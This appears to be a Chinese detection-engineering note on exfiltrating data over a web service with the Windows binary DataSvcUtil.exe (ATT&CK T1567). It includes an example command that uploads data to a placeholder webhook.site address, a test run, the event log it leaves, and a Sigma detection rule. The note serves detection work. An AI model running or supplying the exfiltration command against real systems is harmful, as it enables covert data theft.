# T1567-win-通过Web服务进行渗透-DataSvcUtil.exe(白名单)
## 来自ATT&CK的描述
攻击者可能使用现有的合法外部Web服务而不是他们的主要命令和控制通道来窃取数据。 由于网络中的主机可能在受到攻击之前已经与它们进行通信，因此流行Web服务可能充当渗漏机制的提供大量掩护。 防火墙规则也可能已经存在以允许这些服务的流量。

Web 服务提供商通常也使用 SSL/TLS 加密，为攻击者提供更高级别的保护。
##  测试案例
DataSvcUtil.exe是WCF数据服务提供的命令行工具，它使用开放数据协议(OData)源，并生成从.NET Framework客户端应用程序访问数据服务所需的客户端数据服务类。

路径：
```
- C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe
```

一般上传文件、凭据或数据泄露:
```
DataSvcUtil /out:C:\\Windows\\System32\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile
```

用例：上传文件
所需权限：用户
操作系统：Windows 10

## 检测日志

windows安全日志

## 测试复现
```
C:\Windows\Microsoft.NET\Framework64\v3.5>DataSvcUtil /out:C:\\Windows\\System32\\calc.exe /uri:https://www.baidu.com/
Microsoft (R) DataSvcUtil 版本 3.5.0.0
版权所有 (C) 2008 Microsoft Corporation。保留所有权利。

正在写入对象层文件...
错误 7001: 远程服务器返回错误: (404) 未找到。

生成已完成 -- 1 个错误，0 个警告
```

## 日志留痕
```
已创建新进程。

  

创建者主题:

安全 ID: DESKTOP-PT656L6\liyang

帐户名: liyang

帐户域: DESKTOP-PT656L6

登录 ID: 0x47126

  

目标主题:

安全 ID: NULL SID

帐户名: -

帐户域: -

登录 ID: 0x0

  

进程信息:

新进程 ID: 0x2260

新进程名称: C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe

令牌提升类型: %%1938

强制性标签: Mandatory Label\Medium Mandatory Level

创建者进程 ID: 0x24b4

创建者进程名称: C:\Windows\System32\cmd.exe

进程命令行: DataSvcUtil  /out:C:\\Windows\\System32\\calc.exe /uri:https://www.baidu.com/
```
## 检测规则/思路
参考Sigma官方规则：
```yml
title: LOLBAS Data Exfiltration by DataSvcUtil.exe

id: e290b10b-1023-4452-a4a9-eb31a9013b3a

status: experimental

author: Ialle Teixeira @teixeira0xfffff, Austin Songer @austinsonger

date: 2021/09/30

description: Detects when a user performs data exfiltration by using DataSvcUtil.exe

references:

- https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6

- https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe

- https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services

- https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services

tags:

- attack.exfiltration

- attack.t1567

logsource:

category: process_creation

product: windows

detection:

selection:

CommandLine|contains|all:

- '/in:'

- '/out:'

Image|endswith:

- '\DataSvcUtil.exe'

condition: selection

fields:

- ComputerName

- User

- CommandLine

- ParentCommandLine
```
## 参考推荐
MITRE-ATT&CK-T1567

<https://attack.mitre.org/techniques/T1567>

DataSvcUtil.exe

<https://lolbas-project.github.io/lolbas/Binaries/DataSvcUtil/>